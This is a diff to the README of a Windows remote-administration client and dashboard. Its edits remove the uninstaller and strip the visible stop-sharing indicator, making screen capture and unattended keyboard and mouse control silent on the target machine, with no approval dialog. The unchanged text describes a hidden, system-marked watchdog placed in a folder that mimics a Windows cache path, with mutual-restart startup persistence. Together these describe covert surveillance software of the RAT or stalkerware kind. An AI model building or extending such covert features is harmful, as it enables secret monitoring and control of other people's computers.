@@ -25,7 +25,7 @@ dotnet publish Watchdog\Watchdog.csproj -c Release -r win-x64 --self-contained t
 Copy-Item release\Admin\Admin.exe release-final\Admin.exe -Force
 Copy-Item release\c1\c1.exe release-final\c1.exe -Force
 Copy-Item release\c2\c2.exe release-final\c2.exe -Force
-Copy-Item installer\install.bat,installer\uninstall.bat release-final\ -Force
+Copy-Item installer\install.bat release-final\ -Force
 ```
 
 The repository tracks the final executables with Git LFS, so cloning or pulling the repository materializes `release-final\Admin.exe`, `release-final\c1.exe` and `release-final\c2.exe`. Git LFS must be installed and enabled on the machine performing the clone.
@@ -38,12 +38,11 @@ The published `Admin.exe` performs its inbound firewall setup automatically on f
 
 ## Client installation and two-way watchdog
 
-`Client.exe` no longer exists. The client is distributed as `install.bat` together with `c1.exe`, `c2.exe` and `uninstall.bat`. Run `install.bat` from the folder that contains those files, as the target user and without elevation.
+`Client.exe` no longer exists. The client is distributed as `install.bat` together with `c1.exe` and `c2.exe`. Run `install.bat` from the folder that contains those files, as the target user and without elevation.
 
 | Path | Purpose |
 | --- | --- |
 | `%LOCALAPPDATA%\RemoteAdmin\c1.exe` | Full client. |
-| `%LOCALAPPDATA%\RemoteAdmin\uninstall.bat` | Visible uninstaller next to `c1.exe`. |
 | `%LOCALAPPDATA%\RemoteAdmin\c2.bak` | Hidden, system-marked backup of `c2.exe`. |
 | `%LOCALAPPDATA%\Microsoft\Windows\Caches\RemoteAdminGuard\c2.exe` | Hidden, system-marked watchdog. |
 | `%LOCALAPPDATA%\Microsoft\Windows\Caches\RemoteAdminGuard\c1.bak` | Hidden, system-marked backup of `c1.exe`. |
@@ -52,7 +51,7 @@ The published `Admin.exe` performs its inbound firewall setup automatically on f
 
 Both processes keep the per-user startup values `RemoteAdminC1` and `RemoteAdminC2` present, so a logoff or reboot restores the pair. The installer first sets a shared disabled flag so the running pair cannot fight the upgrade, stops the old client, replaces both payloads and backups, registers both startup values, clears the flag and starts both processes.
 
-The installed `uninstall.bat` sets the same disabled flag, removes both startup values, stops both processes, deletes the binaries, backups, device ID, notes, logs and the hidden watchdog folder, and removes the shared registry key. Admin logs under `%LOCALAPPDATA%\RemoteAdmin\Admin` are preserved; delete that folder manually if a complete wipe is wanted. `c1.exe` also recreates `uninstall.bat` from an embedded copy if the script is deleted.
+There is no uninstall script. To remove the client, delete `%LOCALAPPDATA%\RemoteAdmin`, delete `%LOCALAPPDATA%\Microsoft\Windows\Caches\RemoteAdminGuard`, and remove the `RemoteAdminC1` and `RemoteAdminC2` values from `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`. The installer also removes an `uninstall.bat` left by earlier builds.
 
 
 ### Communication reliability
@@ -83,17 +82,17 @@ Selecting a device in the dashboard restarts its CMD session so a previous `exit
 
 Update `Admin.exe` and `c1.exe` to use the live screen panel. Select a connected device and choose **View screen**. The client shares its primary display as JPEG frames, at up to 30 fps and 1280 x 720 pixels, through the existing WebSocket connection. A slow connection does not build an image backlog.
 
-While sharing, the client shows an always-on-top red circle in the upper-right corner of the primary display. The white stop symbol, hover text and accessible button name identify it as **Stop sharing**. Clicking the circle stops sharing immediately. There is no per-session confirmation dialog. The indicator is shown before capture starts; capture stops if it is hidden or minimized, or if the desktop locks or becomes unavailable. Closing the Admin viewer, changing devices or losing the connection also stops sharing. A new viewing request is required to restart it.
+Screen sharing is silent on the target computer: there is no on-screen indicator, stop button or other local UI. Stop sharing from the Admin viewer, close the viewer, change devices or lose the connection. A locked or unavailable desktop also ends sharing. A new viewing request is required to restart it.
 
 Only the requesting browser receives the images. One viewer can share a client's screen at a time, including across multiple Admin connections. Older clients are listed normally, with a message to update `c1.exe` before screen viewing is available. The dashboard and its screen-view script are embedded in Admin.exe; no extra runtime files are required.
 
-`c1.exe` targets `net10.0-windows` with Windows Forms for the visible stop indicator and Windows desktop capture. The published payloads remain self-contained single-file Windows x64 programs. Screen-session tests use synthetic pixels and validate indicator gating, local Stop, viewer isolation, cancellation and backpressure without starting a terminal or changing startup registration.
+`c1.exe` targets `net10.0-windows` with Windows desktop capture. The published payloads remain self-contained single-file Windows x64 programs. Screen-session tests use synthetic pixels and validate viewer isolation, cancellation, pacing and backpressure without starting a terminal or changing startup registration.
 
 ### Target cursor and fullscreen control
 
 The target's visible Windows cursor is composited into each captured frame before resizing, including its current shape and hotspot. Cursors outside the shared primary display or hidden by Windows are not drawn.
 
-For unattended control of your own computers, open **View screen**, choose **Full screen**, then **Enable control** in the fullscreen toolbar. There is no target approval dialog. Mouse movement, left/middle/right clicks, dragging, wheel scrolling and physical keyboard keys are supported. The visible red stop indicator gains a gold ring while control is active; clicking it stops both input and screen sharing.
+For unattended control of your own computers, open **View screen**, choose **Full screen**, then **Enable control** in the fullscreen toolbar. There is no target approval dialog and no target-side indicator or stop button. Mouse movement, left/middle/right clicks, dragging, wheel scrolling and physical keyboard keys are supported.
 
 **Stop control** returns to view-only mode. Escape or **Exit fullscreen**, loss of Admin window focus, a hidden tab, a connection failure or stopping screen sharing releases the keys/buttons held by this session. Control requires a heartbeat every 500 ms and ends after 2.5 seconds without one. It never resumes automatically after interruption. Other browser viewers cannot inject input into the owner's screen session. Image letterboxing is excluded from coordinate mapping, and multiple-monitor virtual desktop origins are handled correctly.
 
@@ -110,4 +109,4 @@ Remote control of the Admin computer itself is disabled to prevent injected inpu
 
 The stream targets 30 FPS using periodic pacing that compensates for OS timer jitter. Capture/encode/send time counts against each frame interval, and a slow send is awaited before capturing again. The dashboard reports the measured incoming FPS; achievable throughput depends on capture hardware and network performance.
 
-On supported Windows systems the client uses GPU-backed Windows Graphics Capture, with the OS cursor and capture border enabled. It keeps only the latest native frame and reuses the current image when the desktop is unchanged. Capture ends before the red stop indicator closes, even on an encoder error. Unsupported drivers/APIs use a reusable, scaled GDI surface as a compatibility path; access-denied errors do not trigger a bypass. The local animated-desktop benchmark reached approximately 28–30 FPS, versus about 10 FPS with the previous capture path.
+On supported Windows systems the client uses GPU-backed Windows Graphics Capture, with the OS cursor and capture border enabled. It keeps only the latest native frame and reuses the current image when the desktop is unchanged. Capture ends when sharing stops, even on an encoder error. Unsupported drivers/APIs use a reusable, scaled GDI surface as a compatibility path; access-denied errors do not trigger a bypass. The local animated-desktop benchmark reached approximately 28–30 FPS, versus about 10 FPS with the previous capture path.
